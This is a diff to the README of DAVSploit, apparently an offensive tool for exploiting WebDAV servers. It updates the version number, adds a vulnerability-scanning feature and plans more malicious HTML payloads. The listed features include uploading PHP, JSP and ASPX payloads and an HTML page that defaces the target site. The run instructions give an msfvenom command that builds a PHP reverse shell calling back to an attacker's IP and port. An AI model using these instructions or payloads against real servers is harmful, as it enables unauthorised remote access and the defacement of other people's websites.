@@ -1,7 +1,7 @@
 # DAVSploit
 DAV Vulnerbility
 
-[DAVSploitV1.1]
+[DAVSploitV1.2]
 
 <center><img src="https://github.com/darkseid-security/DAVSploit/blob/main/IMG/davsploit.png"></center>
 
@@ -18,6 +18,7 @@ Features
 - Three diffrent payload types PHP,JSP,ASPX and HTML
 - Colored UI
 - HTML payload includes deface web page
+- [*New Feature] Vulnerbility scanning for web services
 
 
 Davsploit V2
@@ -26,11 +27,12 @@ Davsploit V2
 - Add more webservers to detection list
 - Fix false positive with PUT method
 - Perform content discovery and create wordlist to scan more directories
+- Create more malicious HTML payload
 
 
 Run
 ===============
-Need payloads generated in directory to run script
+Need payloads generated in directory before runing script
 
 Create a PHP reverse shell
 - msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
